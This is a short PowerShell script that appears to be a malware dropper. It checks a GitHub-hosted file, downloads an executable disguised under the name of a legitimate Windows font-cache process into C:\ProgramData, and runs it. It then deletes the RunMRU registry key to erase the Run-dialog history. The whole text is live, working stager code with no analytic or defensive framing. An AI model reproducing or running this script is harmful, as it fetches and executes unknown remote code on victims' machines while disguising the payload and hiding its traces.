Start-Sleep -s 10
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$url_text = 'https://raw.githubusercontent.com/qwertyuiopindia/log/main/updated.txt'
# Check if the updated file exists or not
if ((Invoke-WebRequest $url_text -UseBasicParsing).StatusCode -eq 200) {
    # if exists, run PresentationFontCache.exe
    $file = "C:\ProgramData\PresentationFontCache.exe"
    # Run the exe file
    $exec = New-Object -com shell.application
    $exec.shellexecute($file)
} else {
    # not exists, download the new exe file
    $down = New-Object System.Net.WebClient
    $url = 'https://github.com/qwertyuiopindia/log/blob/main/PresentationFontCache.exe?raw=true'
    $file = "C:\ProgramData\PresentationFontCache.exe"
    $down.DownloadFile($url,$file)
    # Run the exe file
    $exec = New-Object -com shell.application
    $exec.shellexecute($file)
}
# Delete registry entry
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
# Exit the script
exit
